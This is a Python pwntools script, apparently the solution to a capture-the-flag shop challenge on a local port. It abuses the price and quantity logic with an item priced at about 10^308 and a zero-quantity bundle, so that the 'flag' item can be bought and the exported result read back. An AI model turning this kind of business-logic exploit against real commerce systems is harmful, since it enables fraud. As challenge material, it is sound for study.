from pwn import *

###Util
def add_item(name, price):
    r.sendlineafter('Choice > ','1')
    r.sendlineafter('name : ',name)
    r.sendlineafter('Price : ',str(price))

def add_bundle(name, items):
    r.sendlineafter('Choice > ','2')
    r.sendlineafter('name : ',name)
    for item in items:
        r.sendlineafter(' : ',item)
    r.sendlineafter(' : ','')

def add_to_cart(name, quantity):
    r.sendlineafter('Choice > ','3')
    r.sendlineafter('name : ',name)
    r.sendlineafter('Quantity : ',str(quantity))

def buy():
    r.sendlineafter('Choice > ','4')

def export():
    r.sendlineafter('Choice > ','5')
    resfile = open('res.xlsx','wb')
    resfile.write(b64d(r.recvline()[:-1].split(b' : ')[1]))
    resfile.close()

def leave():
    r.sendlineafter('Choice > ','6')

###Solve
r = remote('127.0.0.1',10103)

add_item('M30W', int('1'+'0'*308))
add_bundle('M30W_Bundle', ['M30W', 'M30W'])
add_to_cart('flag', 1)
add_to_cart('M30W_Bundle', 0)
buy()
export()
leave()
